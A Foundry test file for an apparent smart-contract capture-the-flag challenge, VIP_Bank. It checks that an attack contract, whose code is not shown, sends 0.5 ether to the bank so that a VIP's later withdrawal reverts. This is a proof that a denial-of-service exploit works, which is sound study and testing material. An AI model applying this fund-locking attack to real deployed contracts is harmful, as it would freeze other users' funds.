// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {VIP_Bank} from "../src/VIP_Bank.sol";
import {VIP_Bank_Attack} from "../src/VIP_Bank_Attack.sol";

contract VIP_BankTest is Test {
    VIP_Bank public target;
    VIP_Bank_Attack public attackContract;
    address manager;
    address attacker;
    address vip;

    function setUp() public {
        manager = makeAddr("manager");
        vip = makeAddr("vip");
        attacker = makeAddr("attacker");

        vm.deal(vip, 0.03 ether);
        vm.deal(attacker, 0.5 ether);
        
        vm.startPrank(manager);
        target = new VIP_Bank();
        target.addVIP(vip);
        vm.stopPrank();
    }

    function test_attack() public {
        // ATTACK
        vm.startPrank(attacker);
        attackContract = new VIP_Bank_Attack(address(target));
        attackContract.attack{value: 0.5 ether}();
        vm.stopPrank();

        // CHECK
        vm.startPrank(vip);
        target.deposit{value: 0.03 ether}();
        vm.expectRevert("Cannot withdraw more than 0.5 ETH per transaction");
        target.withdraw(0.03 ether);
        vm.stopPrank();
    }
}
